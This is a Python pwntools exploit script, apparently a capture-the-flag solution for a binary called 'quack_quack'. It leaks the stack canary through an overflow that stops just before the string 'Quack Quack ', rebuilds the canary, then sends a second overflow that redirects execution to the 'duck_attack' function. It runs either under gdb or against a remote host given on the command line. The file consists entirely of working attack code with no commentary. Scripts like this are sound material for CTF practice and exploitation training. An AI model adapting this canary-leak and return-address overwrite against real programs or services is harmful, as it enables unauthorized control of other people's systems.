#!/usr/bin/env python3

from pwn import *
import sys

def exploit(io, elf):
    win = elf.symbols["duck_attack"]
    secret = b"Quack Quack "
    payload = b"A"*8*11 + b"C" + secret

    io.sendafter(b"> ", payload)
    io.recvuntil(b"Quack Quack ")
    canary = io.recv(7).strip()
    canary = b"\x00" + canary
    
    payload = b"A"*88 + canary + b"B"*8 + p64(win)
    io.sendafter(b"> ", payload) 
    io.recv()
    print(io.recv().decode())

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./quack_quack")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    elf = ELF("./quack_quack")
    exploit(io, elf)

if __name__ == "__main__":
    main()
